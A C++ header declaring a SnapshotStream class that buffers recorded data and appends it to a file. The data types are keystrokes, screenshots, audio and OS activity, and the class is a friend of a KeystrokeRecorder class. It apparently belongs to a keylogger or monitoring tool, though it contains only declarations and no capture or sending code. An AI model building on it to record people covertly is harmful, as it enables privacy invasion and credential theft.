#ifndef SNAPSHOT_STREAM_H
#define SNAPSHOT_STREAM_H

#include <fstream>
#include <string>
#include <cerrno>
#include <cstring>
#include <cstdint>
#include <iostream>
#include <vector>
#include <fstream>
#include <stdexcept>
#include <string>
#include <cerrno>

/**
 * Represents the type of data a byte sequence represents
 */
enum class RecordingType : uint8_t
{
    KEYLOG,
    SCREENSHOT,
    AUDIO,
    OS_ACTIVITY
};

class SnapshotStream
{
public:
    SnapshotStream(const std::string &name)
    {
        file.open(name, std::ios::in | std::ios::app);

        if (!file.is_open())
        {
            throw std::runtime_error("Failed to open output file for SnapshotStream - " + name + ", " + std::strerror(errno));
        }
    }

    ~SnapshotStream()
    {
        file.close();
    }

private:
    friend class KeystrokeRecorder;
    /**
     * Invoked when a recorder captures data
     */
    void handleDataReceived(const char *data, RecordingType type);

    /**
     * Flush all buffered data to file/output stream
     */
    void flushData();

private:
    /**
     * Vector of buffered data
     */
    std::vector<char> recordingBuffer;

    /**
     * File that the SnapshotStream is being serialized to
     */
    std::wfstream file;
};
#endif